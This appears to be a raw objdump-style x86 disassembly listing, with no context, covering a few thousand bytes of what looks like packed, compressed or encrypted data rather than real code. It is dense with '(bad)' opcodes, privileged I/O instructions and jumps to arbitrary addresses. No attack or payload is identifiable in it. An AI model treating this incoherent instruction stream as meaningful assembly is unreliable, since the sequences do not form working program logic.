  4c5c66:	jne    0x4c5c07
  4c5c68:	xchg   esi,eax
  4c5c69:	sub    eax,0x30540662
  4c5c6e:	xor    eax,0x737409f
  4c5c73:	add    ebp,ecx
  4c5c75:	jmp    0x4c5bf7
  4c5c77:	leave  
  4c5c78:	sbb    BYTE PTR [esi-0x14],ch
  4c5c7b:	add    DWORD PTR [ecx-0x62],edi
  4c5c7e:	or     BYTE PTR [eax],ah
  4c5c80:	jg     0x4c5c22
  4c5c82:	add    al,BYTE PTR [eax+0x17]
  4c5c85:	repnz and DWORD PTR [edi],esp
  4c5c88:	jns    0x4c5c52
  4c5c8a:	add    eax,0x9c4008fa
  4c5c8f:	or     al,0xf
  4c5c91:	repnz and DWORD PTR [edi],ebx
  4c5c94:	push   eax
  4c5c95:	ret    
  4c5c96:	mov    esp,tr6
  4c5c99:	adc    al,BYTE PTR [eax-0x701a676a]
  4c5c9f:	jl     0x4c5c31
  4c5ca1:	push   ss
  4c5ca2:	and    BYTE PTR [esi+edi*4-0x3640fbe7],bh
  4c5ca9:	sbb    ecx,DWORD PTR [esi-0xcc]
  4c5caf:	jg     0x4c5c52
  4c5cb1:	in     eax,dx
  4c5cb2:	int3   
  4c5cb3:	into   
  4c5cb4:	sbb    eax,edx
  4c5cb6:	ror    DWORD PTR [esi+0x40],cl
  4c5cb9:	and    al,dh
  4c5cbb:	sahf   
  4c5cbc:	mov    ch,0x70
  4c5cbe:	sub    ebp,DWORD PTR [eax+0x699dc5ad]
  4c5cc4:	inc    eax
  4c5cc5:	rcr    BYTE PTR [ebp-0x3],1
  4c5cc8:	and    eax,0x4f8e1ae5
  4c5ccd:	sbb    ebx,ebp
  4c5ccf:	(bad)  
  4c5cd0:	(bad)  
  4c5cd1:	(bad)  
  4c5cd2:	inc    DWORD PTR [ebx-0x28698ec0]
  4c5cd8:	xchg   ebp,eax
  4c5cd9:	inc    ebx
  4c5cda:	push   cs
  4c5cdb:	add    eax,0x9eaf298d
  4c5ce0:	inc    eax
  4c5ce1:	stc    
  4c5ce2:	mov    edi,0x81ed44a0
  4c5ce7:	adc    cl,BYTE PTR [edi+0x40b98281]
  4c5ced:	mov    edi,0xcfa6d53c
  4c5cf2:	(bad)  
  4c5cf3:	(bad)  
  4c5cf4:	(bad)  
  4c5cf5:	(bad)  
  4c5cf6:	in     eax,dx
  4c5cf7:	dec    ecx
  4c5cf8:	pop    ds
  4c5cf9:	js     0x4c5d73
  4c5cfb:	inc    eax
  4c5cfc:	outs   dx,DWORD PTR ds:[esi]
  4c5cfd:	(bad)  
  4c5cfe:	loopne 0x4c5c8c
  4c5d00:	jmp    0xba942685
  4c5d05:	xchg   ebx,eax
  4c5d06:	test   al,0x41
  4c5d08:	mov    esp,0x27556b85
  4c5d0d:	cmp    DWORD PTR [ebp+0x7ce070f7],ecx
  4c5d13:	inc    edx
  4c5d14:	(bad)  
  4c5d15:	(bad)  
  4c5d16:	(bad)  
  4c5d17:	(bad)  
  4c5d18:	mov    esp,0xf9de8edd
  4c5d1d:	popf   
  4c5d1e:	sti    
  4c5d1f:	jmp    0x4c5d9f
  4c5d21:	stos   BYTE PTR es:[edi],al
  4c5d22:	push   ecx
  4c5d23:	inc    ebx
  4c5d24:	mov    eax,ds:0xcce376e6
  4c5d29:	repnz sub DWORD PTR [edi],ebp
  4c5d2c:	test   BYTE PTR [ecx+0x10284426],al
  4c5d32:	pop    ss
  4c5d33:	stos   BYTE PTR es:[edi],al
  4c5d34:	clc    
  4c5d35:	scas   al,BYTE PTR es:[edi]
  4c5d36:	adc    bl,ah
  4c5d38:	(bad)  
  4c5d39:	(bad)  
  4c5d3a:	(bad)  
  4c5d3b:	inc    ebp
  4c5d3d:	(bad)  
  4c5d3e:	cli    
  4c5d3f:	inc    esp
  4c5d40:	jmp    0x4c5ce9
  4c5d42:	aam    0xf3
  4c5d44:	imul   ebx
  4c5d46:	loope  0x4c5d92
  4c5d48:	jp     0x4c5cdf
  4c5d4a:	iret   
  4c5d4b:	inc    ebp
  4c5d4c:	gs int3 
  4c5d4e:	(bad)  
  4c5d4f:	xchg   ecx,eax
  4c5d50:	push   cs
  4c5d51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c5d52:	scas   al,BYTE PTR es:[edi]
  4c5d53:	mov    al,ds:0x46a3e319
  4c5d58:	or     eax,0xff0c1765
  4c5d5d:	(bad)  
  4c5d5e:	(bad)  
  4c5d5f:	push   DWORD PTR [ebp-0x7f]
  4c5d62:	xchg   BYTE PTR [ebp+0x76],dh
  4c5d65:	leave  
  4c5d66:	dec    eax
  4c5d67:	dec    ebp
  4c5d68:	pop    eax
  4c5d69:	inc    edx
  4c5d6a:	in     al,0xa7
  4c5d6c:	xchg   ebx,eax
  4c5d6d:	cmp    DWORD PTR [ebx],edi
  4c5d6f:	xor    eax,0x53edb2b8
  4c5d74:	dec    ebp
  4c5d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c5d76:	in     eax,0x5d
  4c5d78:	cmp    eax,0x8b3b5dc5
  4c5d7d:	sahf   
  4c5d7e:	xchg   edx,eax
  4c5d7f:	pop    edx
  4c5d80:	(bad)  
  4c5d81:	(bad)  
  4c5d82:	(bad)  
  4c5d83:	(bad)  
  4c5d84:	call   FWORD PTR [ebp-0x5a]
  4c5d87:	lock mov eax,ds:0xa554c020
  4c5d8d:	mov    WORD PTR [edi],?
  4c5d8f:	popa   
  4c5d90:	sar    ebp,1
  4c5d92:	mov    ebx,DWORD PTR [edx-0x75]
  4c5d95:	fsub   DWORD PTR ds:0xdbf9895d
  4c5d9b:	stos   BYTE PTR es:[di],al
  4c5d9d:	xchg   ebp,eax
  4c5d9e:	clc    
  4c5d9f:	repz daa 
  4c5da1:	mov    edi,0x3296c8a2
  4c5da6:	(bad)  
  4c5da7:	call   FWORD PTR [ebp-0x23]
  4c5daa:	sub    BYTE PTR [esi+0x4c],0xc9
  4c5dae:	fwait
  4c5daf:	xchg   edi,eax
  4c5db0:	and    BYTE PTR [edx-0x3b9fadfe],cl
  4c5db6:	and    eax,0x9ff77fe1
  4c5dbb:	fxch   st(5)
  4c5dbd:	int3   
  4c5dbe:	add    al,BYTE PTR [ecx]
  4c5dc0:	sti    
  4c5dc1:	aas    
  4c5dc2:	jno    0x4c5e01
  4c5dc4:	or     dl,bh
  4c5dc6:	mov    ds:0x3ff80970,eax
  4c5dcb:	pop    edx
  4c5dcc:	fs cmp ebx,edi
  4c5dcf:	dec    edi
  4c5dd0:	(bad)  
  4c5dd1:	(bad)  
  4c5dd2:	(bad)  
  4c5dd3:	dec    DWORD PTR [ebp-0x7ced9169]
  4c5dd9:	cmc    
  4c5dda:	aas    
  4c5ddb:	ret    
  4c5ddc:	shr    DWORD PTR [eiz*2+0x1758e219],cl
  4c5de3:	mov    bh,0xd1
  4c5de5:	icebp  
  4c5de6:	aas    
  4c5de7:	ror    BYTE PTR [edi],1
  4c5de9:	and    eax,DWORD PTR [edi+eax*2-0x3a53b8e5]
  4c5df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c5df1:	out    dx,al
  4c5df2:	aas    
  4c5df3:	inc    eax
  4c5df4:	(bad)  
  4c5df5:	(bad)  
  4c5df6:	(bad)  
  4c5df7:	jmp    DWORD PTR [esi-0x5093964a]
  4c5dfd:	add    eax,0xeb8637bd
  4c5e02:	aas    
  4c5e03:	xor    edi,DWORD PTR ds:0xe57a42bc
  4c5e09:	aad    0x94
  4c5e0b:	mov    edi,0xc23fe7d6
  4c5e10:	std    
  4c5e11:	std    
  4c5e12:	into   
  4c5e13:	popa   
  4c5e14:	test   BYTE PTR [ecx],dl
  4c5e16:	ja     0x4c5de4
  4c5e18:	(bad)  
  4c5e19:	(bad)  
  4c5e1a:	(bad)  
  4c5e1b:	jmp    FWORD PTR [ebx+0x4c2f3fe4]
  4c5e21:	pop    ebx
  4c5e22:	loope  0x4c5e71
  4c5e24:	les    edi,FWORD PTR [esi-0x36196a6c]
  4c5e2a:	aas    
  4c5e2b:	xchg   edx,eax
  4c5e2c:	les    edx,FWORD PTR [ebx+0x3b]
  4c5e2f:	jne    0x4c5e75
  4c5e31:	int    0x14
  4c5e33:	mov    esi,0xde3faf9a
  4c5e38:	addr16 mov edx,0xffff3994
  4c5e3e:	(bad)  
  4c5e3f:	inc    DWORD PTR [ebp-0x53]
  4c5e42:	push   ds
  4c5e43:	mov    cl,0xcf
  4c5e45:	xchg   esp,eax
  4c5e46:	aas    
  4c5e47:	and    al,0x23
  4c5e49:	(bad)  
  4c5e4a:	loop   0x4c5e08
  4c5e4c:	mov    edx,0x8b61313b
  4c5e51:	jp     0x4c5e92
  4c5e53:	popa   
  4c5e54:	push   ebp
  4c5e55:	pop    ecx
  4c5e56:	sar    DWORD PTR [esi-0x4f],0x53
  4c5e5a:	jl     0x4c5e6e
  4c5e5c:	mov    ebx,0xffd73f5f
  4c5e61:	(bad)  
  4c5e62:	(bad)  
  4c5e64:	out    dx,al
  4c5e65:	das    
  4c5e66:	lea    eax,[esi]
  4c5e68:	mov    esi,0xfb158592
  4c5e6d:	inc    esp
  4c5e6e:	inc    esi
  4c5e6f:	aas    
  4c5e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c5e71:	jmp    0xea7403af
  4c5e76:	jg     0x4c5e20
  4c5e78:	sub    bh,BYTE PTR [edi]
  4c5e7a:	jge    0x4c5e28
  4c5e7c:	mov    eax,ds:0x7c64bce4
  4c5e81:	(bad)  
  4c5e82:	(bad)  
  4c5e83:	(bad)  
  4c5e84:	inc    DWORD PTR [esi-0x30]
  4c5e87:	fst    QWORD PTR [ebp+0x3e]
  4c5e8a:	arpl   WORD PTR [ebx+0x6],di
  4c5e8d:	int3   
  4c5e8e:	and    edx,DWORD PTR [edi+esi*2-0x7d]
  4c5e92:	call   DWORD PTR [ecx-0x56ec27f]
  4c5e98:	cmp    bl,BYTE PTR [ecx]
  4c5e9a:	jp     0x4c5eff
  4c5e9c:	and    eax,0xacc03143
  4c5ea1:	cmp    al,0x21
  4c5ea3:	mov    ecx,edx
  4c5ea5:	(bad)  
  4c5ea6:	(bad)  
  4c5ea7:	(bad)  
  4c5ea8:	(bad)  
  4c5ea9:	cmp    BYTE PTR [edx+0xb89747],al
  4c5eaf:	std    
  4c5eb0:	xlat   BYTE PTR ds:[ebx]
  4c5eb1:	cmp    ebx,esp
  4c5eb3:	mov    BYTE PTR [eax+0x8],bl
  4c5eb6:	sbb    esi,DWORD PTR [ecx-0x59791c18]
  4c5ebc:	add    edi,DWORD PTR [ebx]
  4c5ebe:	mov    BYTE PTR [ebp+eax*2-0x6649f8be],0x75
  4c5ec6:	aaa    
  4c5ec7:	fld    TBYTE PTR [esi]
  4c5ec9:	(bad)  
  4c5eca:	(bad)  
  4c5ecb:	(bad)  
  4c5ecc:	(bad)  
  4c5ecd:	cmp    dh,BYTE PTR [ebx]
  4c5ecf:	jno    0x4c5eed
  4c5ed1:	shl    BYTE PTR [ebx],cl
  4c5ed3:	(bad)  [edx]
  4c5ed5:	out    dx,al
  4c5ed6:	dec    ecx
  4c5ed7:	nop
  4c5ed8:	pop    edx
  4c5ed9:	cmp    DWORD PTR [esi+0x57c0be87],esp
  4c5edf:	fisub  DWORD PTR [ebp-0x4a5d597e]
  4c5ee5:	xor    ah,dl
  4c5ee7:	push   0x52a711b2
  4c5eec:	lahf   
  4c5eed:	(bad)  
  4c5eee:	(bad)  
  4c5eef:	(bad)  
  4c5ef0:	inc    DWORD PTR [ecx+ebx*2-0x49]
  4c5ef4:	adc    BYTE PTR [eiz*1+0x362de449],ch
  4c5efb:	xor    al,0x4f
  4c5efd:	push   ebx
  4c5efe:	scas   al,BYTE PTR es:[edi]
  4c5eff:	into   
  4c5f00:	imul   esp,DWORD PTR ds:0xa404598f,0xffffffc0
  4c5f07:	faddp  st(2),st
  4c5f09:	jge    0x4c5f06
  4c5f0b:	call   0xe7ea7dd6
  4c5f10:	mov    BYTE PTR [edi-0x5],bh
  4c5f13:	(bad)  
  4c5f14:	call   FWORD PTR [edx+0x57]
  4c5f17:	xchg   ecx,eax
  4c5f18:	cmp    al,0xbf
  4c5f1a:	push   eax
  4c5f1b:	and    DWORD PTR [edx],0x18
  4c5f1e:	dec    esi
  4c5f1f:	dec    ebx
  4c5f20:	gs (bad) 
  4c5f22:	std    
  4c5f23:	or     DWORD PTR [edi+0x7d9406af],0x11
  4c5f2a:	pop    edx
  4c5f2b:	ficomp WORD PTR [edi+0x4c8d2ce]
  4c5f31:	fisttp QWORD PTR [esp+eax*4]
  4c5f34:	ss ret 0xd8a6
  4c5f38:	sub    edx,DWORD PTR [esi+eiz*1+0x5aeb9e4f]
  4c5f3f:	jb     0x4c5f41
  4c5f41:	addr16 push ds
  4c5f43:	cmp    esi,ebx
  4c5f45:	cmp    al,0xcf
  4c5f47:	repz push es
  4c5f49:	pop    edx
  4c5f4a:	js     0x4c5ee3
  4c5f4c:	mov    ch,0xd4
  4c5f4e:	idiv   BYTE PTR [ecx-0x66]
  4c5f51:	iret   
  4c5f52:	repz adc DWORD PTR [ecx],eax
  4c5f55:	xor    BYTE PTR [esi+0x6d],cl
  4c5f58:	add    DWORD PTR [edi-0xd],esp
  4c5f5b:	cmp    al,0xcf
  4c5f5d:	fwait
  4c5f5e:	cmp    al,BYTE PTR [esi]
  4c5f60:	pop    ecx
  4c5f61:	ja     0x4c5ef9
  4c5f63:	mov    ah,0xe7
  4c5f65:	imul   edi,DWORD PTR [esi],0x10f2d3cf
  4c5f6b:	add    DWORD PTR [edi],ebp
  4c5f6d:	dec    ebp
  4c5f6e:	bndstx ds:0xdf016cd4,bnd2
  4c5f75:	pop    es
  4c5f76:	(bad)  
  4c5f77:	jmp    0x4c5fbb
  4c5f79:	iret   
  4c5f7a:	jnp    0x4c5efd
  4c5f7c:	iret   
  4c5f7d:	add    BYTE PTR [ebx-0x78],bl
  4c5f80:	dec    esp
  4c5f81:	out    0x7c,eax
  4c5f83:	push   cs
  4c5f84:	add    DWORD PTR [eax+0x3c],esi
  4c5f87:	iret   
  4c5f88:	repz cmp al,0x2
  4c5f8b:	pusha  
  4c5f8c:	add    eax,DWORD PTR [eax+0x4]
  4c5f8f:	repz cmp al,0xcf
  4c5f92:	repz sub BYTE PTR ds:0xe7040618,al
  4c5f99:	jns    0x4c5f35
  4c5f9b:	iret   
  4c5f9c:	pop    es
  4c5f9d:	in     al,dx
  4c5f9e:	dec    ebx
  4c5f9f:	or     al,dl
  4c5fa1:	or     DWORD PTR [esi-0x47618619],ebx
  4c5fa7:	or     ch,BYTE PTR [eax+0x710c9c0b]
  4c5fad:	sub    BYTE PTR [edx],cl
  4c5faf:	jbe    0x4c5f80
  4c5fb1:	xor    al,0xc1
  4c5fb3:	jl     0x4c5f53
  4c5fb5:	out    0x19,eax
  4c5fb7:	xchg   BYTE PTR [esi],al
  4c5fb9:	adc    al,0xc
  4c5fbb:	add    al,0xf8
  4c5fbd:	shl    bl,0x3c
  4c5fc0:	iret   
  4c5fc1:	shr    esp,cl
  4c5fc3:	in     al,0xd8
  4c5fc5:	int3   
  4c5fc6:	ror    bh,0xf3
  4c5fc9:	cmp    al,0xcf
  4c5fcb:	mov    al,ds:0x183c6080
  4c5fd0:	lock sahf 
  4c5fd2:	out    0x79,eax
  4c5fd4:	call   0x4058:0x7ca4c8bf
  4c5fdb:	out    0xdd,eax
  4c5fdd:	out    0x79,eax
  4c5fdf:	sub    BYTE PTR [esp+esi*8],cl
  4c5fe2:	mov    esi,0x9ec00686
  4c5fe7:	out    0x79,eax
  4c5fe9:	sahf   
  4c5fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c5feb:	mov    WORD PTR [eax+0x68],?
  4c5fee:	push   eax
  4c5fef:	cmp    BYTE PTR [ecx*8+0x102079e7],bh
  4c5ff6:	lock mov ebp,0x3cf3c4dc
  4c5ffc:	iret   
  4c5ffd:	repz mov al,ds:0x1c40547c
  4c6003:	cmp    al,0xcf
  4c6005:	cmp    ebp,edi
  4c6007:	add    BYTE PTR [ebp-0x43f943ba],bh
  4c600d:	cwde   
  4c600e:	js     0x4c6003
  4c6010:	cmp    al,0xcf
  4c6012:	repz pusha 
  4c6014:	dec    esp
  4c6015:	sub    BYTE PTR [eax],dl
  4c6017:	add    BYTE PTR [edi+ecx*8],bh
  4c601a:	repz out dx,al
  4c601c:	in     al,dx
  4c601d:	mov    ebx,0xb0c0064e
  4c6022:	xchg   esp,eax
  4c6023:	test   bl,dh
  4c6025:	cmp    al,0xcf
  4c6027:	repz je 0x4c608a
  4c602a:	inc    esp
  4c602b:	xor    BYTE PTR [eax],bl
  4c602d:	out    dx,eax
  4c602e:	jns    0x4c5fca
  4c6030:	iret   
  4c6031:	add    al,ch
  4c6033:	mov    edx,0x16c0c8d0
  4c6038:	mov    ah,0x3c
  4c603a:	iret   
  4c603b:	repz cmp al,0x98
  4c603e:	jl     0x4c60a0
  4c6040:	inc    eax
  4c6041:	sub    al,0x3b
  4c6043:	lahf   
  4c6044:	out    0xf3,al
  4c6046:	sbb    al,0xd8
  4c6048:	pop    edi
  4c6049:	or     al,bh
  4c604b:	mov    ecx,0x3cf3cf06
  4c6050:	iret   
  4c6051:	les    esi,FWORD PTR [eax+0x4c6c849c]
  4c6057:	sahf   
  4c6058:	out    0xf3,al
  4c605a:	cmp    al,0x28
  4c605c:	or     al,0xf8
  4c605e:	mov    eax,0x9e71c8dc
  4c6063:	out    0x79,eax
  4c6065:	lods   al,BYTE PTR ds:[esi]
  4c6066:	cwde   
  4c6067:	mov    BYTE PTR [eax+0x36],bh
  4c606a:	pop    ebp
  4c606b:	inc    eax
  4c606c:	sbb    BYTE PTR [ecx-0x54d6fe33],dl
  4c6072:	push   ss
  4c6073:	ss test al,0x17
  4c6076:	sub    DWORD PTR [ebp+0x7f6ad837],esi
  4c607c:	sub    DWORD PTR [ebx],ecx
  4c607e:	sub    DWORD PTR [ecx+eax*8+0x6],ebp
  4c6082:	sub    al,0x53
  4c6084:	jge    0x4c60af
  4c6086:	add    DWORD PTR [ebp-0x38],0xc51d0114
  4c608d:	mov    eax,0xc104c12a
  4c6092:	add    eax,0x80e31d70
  4c6097:	push   ebx
  4c6098:	push   es
  4c6099:	shr    edi,0xff
  4c609c:	mov    edi,0x9601514b
  4c60a1:	xor    BYTE PTR [edi],al
  4c60a3:	ja     0x4c60d1
  4c60a5:	popa   
  4c60a6:	push   cs
  4c60a7:	out    dx,al
  4c60a8:	mov    edx,0x19990951
  4c60ad:	(bad)  
  4c60ae:	(bad)  
  4c60af:	(bad)  
  4c60b0:	(bad)  
  4c60b1:	jmp    FWORD PTR [ebp+0x7]
  4c60b4:	(bad)  
  4c60b5:	hlt    
  4c60b6:	push   0x70
  4c60b8:	xor    eax,0xa3e963a5
  4c60bd:	xchg   ebp,eax
  4c60be:	fs sahf 
  4c60c0:	xor    cl,BYTE PTR [eax-0x475bf125]
  4c60c6:	fdivr  QWORD PTR [ecx+0x1e]
  4c60c9:	jmp    0xd9d541a3
  4c60ce:	rcl    BYTE PTR [edi-0xb3d5],cl
  4c60d4:	(bad)  
  4c60d5:	push   DWORD PTR [esi-0x4e8342f7]
  4c60db:	jle    0x4c60e4
  4c60dd:	sub    eax,0x1d91e7b8
  4c60e2:	mov    edi,0xb7106490
  4c60e7:	sbb    eax,0x6ab020f2
  4c60ec:	dec    eax
  4c60ed:	jno    0x4c60a8
  4c60ef:	repz fiadd WORD PTR [ecx-0x42]
  4c60f3:	test   BYTE PTR [ebp-0x2c],bh
  4c60f6:	(bad)  
  4c60f7:	(bad)  
  4c60f8:	(bad)  
  4c60f9:	(bad)  
  4c60fa:	ficomp DWORD PTR [edx]
  4c60fc:	jmp    0x4c60e2
  4c60fe:	(bad)  [ebp+0x51]
  4c6101:	mov    ch,0xd4
  4c6103:	hlt    
  4c6104:	mov    DWORD PTR [ebp-0x67a97c2d],0xa8c0136c
  4c610e:	imul   esp,DWORD PTR [edx+edi*2-0x7],0x62
  4c6113:	std    
  4c6114:	in     al,dx
  4c6115:	leave  
  4c6116:	mov    cl,BYTE PTR gs:[edi+0x5c]
  4c611a:	(bad)  
  4c611b:	(bad)  
  4c611c:	(bad)  
  4c611d:	inc    DWORD PTR [ecx]
  4c611f:	adc    al,0xd9
  4c6121:	ins    BYTE PTR es:[edi],dx
  4c6122:	push   es
  4c6123:	arpl   WORD PTR [ebx+0x3d],sp
  4c6126:	psubd  mm6,mm5
  4c6129:	or     eax,0x20c88d08
  4c612e:	outs   dx,BYTE PTR ds:[esi]
  4c612f:	cmp    ebx,DWORD PTR [esi+0x10]
  4c6132:	imul   ecx,DWORD PTR [esp+eiz*8+0x41],0x7172d560
  4c613a:	addr16 mov ds:0xe4d1,al
  4c613e:	(bad)  
  4c613f:	(bad)  
  4c6140:	(bad)  
  4c6141:	inc    DWORD PTR [ebx]
  4c6143:	cmp    al,0x47
  4c6145:	aam    0x4
  4c6147:	dec    ebx
  4c6148:	std    
  4c6149:	test   DWORD PTR ds:0xab56bd2,ecx
  4c614f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c6150:	cli    
  4c6151:	test   al,0xb5
  4c6153:	xor    eax,0x42b2986c
  4c6158:	(bad)  
  4c6159:	leave  
  4c615a:	mov    ebx,0xbcf940db
  4c615f:	lods   al,BYTE PTR ds:[esi]
  4c6160:	jecxz  0x4c61ce
  4c6162:	(bad)  
  4c6163:	(bad)  
  4c6164:	(bad)  
  4c6165:	(bad)  
  4c6166:	fdiv   DWORD PTR [edx]
  4c6168:	jne    0x4c61c6
  4c616a:	fild   WORD PTR [ebp-0x31]
  4c616d:	or     eax,0x3d59dcd6
  4c6172:	shr    DWORD PTR [ebx+0x26d930ac],1
  4c6178:	cmp    al,BYTE PTR [eax]
  4c617a:	ficom  WORD PTR [ecx-0x80]
  4c617d:	push   ecx
  4c617e:	xlat   BYTE PTR ds:[ebx]
  4c617f:	enter  0x6116,0xd0
  4c6183:	mov    edi,0xfffff4b5
  4c6188:	(bad)  
  4c6189:	push   DWORD PTR [ecx+eiz*1+0x56b3c423]
  4c6190:	cdq    
  4c6191:	xchg   ebp,eax
  4c6192:	mov    edx,0xbda50fcf
  4c6197:	mov    eax,0x2802b89e
  4c619c:	or     BYTE PTR [eax-0x264da0fb],cl
  4c61a2:	or     al,0xc6
  4c61a4:	and    al,0xe9
  4c61a6:	or     esi,DWORD PTR [ecx-0x8379]
  4c61ac:	(bad)  
  4c61ad:	jmp    FWORD PTR [edi+0x2f]
  4c61b0:	adc    DWORD PTR [eax+ebp*2+0x58],ecx
  4c61b4:	stos   DWORD PTR es:[edi],eax
  4c61b5:	sbb    eax,0x2d3dc161
  4c61ba:	data16 mov dh,0x90
  4c61bd:	inc    ecx
  4c61be:	fdiv   QWORD PTR [esi+0x6]
  4c61c1:	jno    0x4c619e
  4c61c3:	add    DWORD PTR [eax+eiz*1+0x102a98d2],edi
  4c61ca:	aad    0xef
  4c61cc:	mov    DWORD PTR [ebp-0xf6a],eax
  4c61d2:	mov    cl,0x71
  4c61d4:	pop    ds
  4c61d5:	mov    ch,0xb6
  4c61d7:	push   es
  4c61d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c61d9:	in     al,0xbf
  4c61db:	lahf   
  4c61dc:	xor    edx,esp
  4c61de:	mov    eax,0x7c9a2e8
  4c61e3:	js     0x4c6219
  4c61e5:	stc    
  4c61e6:	(bad)  
  4c61e7:	(bad)  
  4c61e8:	inc    ebp
  4c61ea:	push   esp
  4c61eb:	test   al,0x9
  4c61ed:	xchg   esi,eax
  4c61ee:	sbb    BYTE PTR [eax+0xdbbe10e],bl
  4c61f4:	push   0x7f
  4c61f6:	sub    eax,0x97086d3d
  4c61fb:	ins    BYTE PTR es:[edi],dx
  4c61fc:	fs xchg ecx,eax
  4c61fe:	add    DWORD PTR [ebx+eiz*2-0x1a],ebx
  4c6202:	hlt    
  4c6203:	push   ecx
  4c6204:	(bad)  
  4c6205:	(bad)  
  4c6206:	(bad)  
  4c6207:	jmp    FWORD PTR [ebx+0x6b]
  4c620a:	bound  esp,QWORD PTR [ecx+0x6c]
  4c620d:	sbb    al,0xd8
  4c620f:	xor    BYTE PTR [ebp-0x7b],ah
  4c6212:	dec    esi
  4c6213:	add    BYTE PTR [edx-0xe],ah
  4c6216:	in     eax,dx
  4c6217:	xchg   ebp,eax
  4c6218:	push   es
  4c6219:	ins    BYTE PTR es:[edi],dx
  4c621a:	jnp    0x4c61c1
  4c621c:	add    DWORD PTR [ebx],ebx
  4c621e:	shl    esp,0x8
  4c6221:	adc    BYTE PTR [edi-0x3c],0xf
  4c6225:	cmc    
  4c6226:	(bad)  
  4c6227:	fcos   
  4c6229:	(bad)  
  4c622a:	(bad)  
  4c622b:	push   DWORD PTR [eax-0x4816af9b]
  4c6231:	adc    ch,dl
  4c6233:	mov    eax,0x887c8bbe
  4c6238:	mov    ecx,0xdd1ddffc
  4c623d:	bound  ecx,QWORD PTR [ecx+0x2d]
  4c6240:	ficom  DWORD PTR ds:0x8cd37cf3
  4c6246:	gs dec esp
  4c6248:	aam    0xfb
  4c624a:	pop    eax
  4c624b:	popa   
  4c624c:	(bad)  
  4c624e:	mov    edi,0xce4db2e1
  4c6253:	pop    eax
  4c6254:	cmp    dh,BYTE PTR [eax+eax*1-0x44]
  4c6258:	mov    ds:0xd4bb30e2,eax
  4c625d:	inc    ecx
  4c625e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c625f:	fisttp WORD PTR [edx-0x29]
  4c6262:	xchg   ebp,eax
  4c6263:	fadd   st,st(2)
  4c6265:	(bad)  
  4c6266:	sar    edi,1
  4c6268:	(bad)  
  4c6269:	(bad)  
  4c626a:	jmp    DWORD PTR [ebx+edi*8+0x6ad3d6f4]
  4c6271:	jmp    0xda48a5df
  4c6276:	outs   dx,BYTE PTR ds:[esi]
  4c6277:	xor    al,0x46
  4c6279:	mov    BYTE PTR [edi-0x53],ah
  4c627c:	sar    BYTE PTR [eax+0x2d73da60],1
  4c6282:	add    al,0x44
  4c6284:	in     eax,0x1d
  4c6286:	add    esi,DWORD PTR [ebx]
  4c6288:	pop    edi
  4c6289:	dec    esp
  4c628a:	or     bh,bh
  4c628c:	(bad)  
  4c628d:	(bad)  
  4c628e:	jmp    FWORD PTR [edx-0x22f28337]
  4c6294:	cmp    al,0x71
  4c6296:	add    eax,0x241aa50
  4c629b:	daa    
  4c629c:	adc    BYTE PTR [eax],dl
  4c629e:	or     edi,DWORD PTR [esi-0x36f3df7a]
  4c62a4:	and    eax,0xb35768b5
  4c62a9:	test   DWORD PTR [edi+0x20],ebp
  4c62ac:	or     esp,edx
  4c62ae:	data16 (bad) 
  4c62b0:	(bad)  
  4c62b1:	(bad)  
  4c62b2:	(bad)  
  4c62b3:	mov    ecx,0xce61e49f
  4c62b8:	push   cs
  4c62b9:	stc    
  4c62ba:	ficomp WORD PTR [esi-0x68]
  4c62bd:	leave  
  4c62be:	fldcw  WORD PTR [ecx]
  4c62c0:	and    bl,BYTE PTR [eax-0x574b4f30]
  4c62c6:	xlat   BYTE PTR ds:[ebx]
  4c62c7:	(bad)  
  4c62c8:	pop    ss
  4c62c9:	cmp    eax,0xd8159b3
  4c62ce:	mov    ah,0x2e
  4c62d0:	cmp    ebx,DWORD PTR [ebp+edi*4-0x1]
  4c62d4:	(bad)  
  4c62d5:	(bad)  
  4c62d6:	push   DWORD PTR [edi-0x3f459353]
  4c62dc:	and    BYTE PTR [ebx-0x4c491248],al
  4c62e2:	mov    edi,0xb6e20c9a
  4c62e7:	add    ebx,DWORD PTR [edx+0x3974b1d2]
  4c62ed:	inc    edi
  4c62ee:	aad    0xea
  4c62f0:	scas   eax,DWORD PTR es:[edi]
  4c62f1:	ja     0x4c62c5
  4c62f3:	popf   
  4c62f4:	adc    eax,0xfffedb26
  4c62f9:	(bad)  
  4c62fa:	inc    DWORD PTR [ebx+eax*4]
  4c62fd:	push   ss
  4c62fe:	fdiv   QWORD PTR [ebx+0x12]
  4c6301:	or     esp,DWORD PTR [ebx-0x1d]
  4c6304:	test   BYTE PTR [ebx],bh
  4c6306:	fs xchg esp,eax
  4c6308:	ds push 0x6d
  4c630b:	or     eax,0x7a6a5aa8
  4c6310:	or     ecx,edi
  4c6312:	push   cs
  4c6313:	in     al,0x9d
  4c6315:	dec    DWORD PTR [ecx]
  4c6317:	xchg   ebx,eax
  4c6318:	daa    
  4c6319:	scas   al,BYTE PTR es:[edi]
  4c631a:	(bad)  
  4c631b:	(bad)  
  4c631c:	(bad)  
  4c631d:	cmp    ebx,DWORD PTR [ecx+esi*4+0x447d079e]
  4c6324:	xchg   ebx,eax
  4c6325:	(bad)  
  4c6327:	shl    BYTE PTR [ebx-0xd9778f8],cl
  4c632d:	add    DWORD PTR [esi],ebx
  4c632f:	inc    dl
  4c6331:	push   es
  4c6332:	imul   ebx,DWORD PTR [ebp+0x57],0x67cbf762
  4c6339:	(bad)  
  4c633a:	(bad)  
  4c633b:	(bad)  
  4c633c:	jmp    DWORD PTR [ebp-0x80]
  4c633f:	jno    0x4c6377
  4c6341:	ins    BYTE PTR es:[edi],dx
  4c6342:	sbb    edi,esp
  4c6344:	push   es
  4c6345:	imul   ebp,DWORD PTR [esi+0x76],0x1b
  4c6349:	aam    0xfe
  4c634b:	loopne 0x4c6378
  4c634d:	ror    DWORD PTR [ecx+0x10da7a5a],cl
  4c6353:	int3   
  4c6354:	dec    edx
  4c6355:	frstor [edi+0x6f]
  4c6358:	fistp  QWORD PTR [ecx-0x100607]
  4c635e:	(bad)  
  4c635f:	(bad)  
  4c6360:	(bad)  
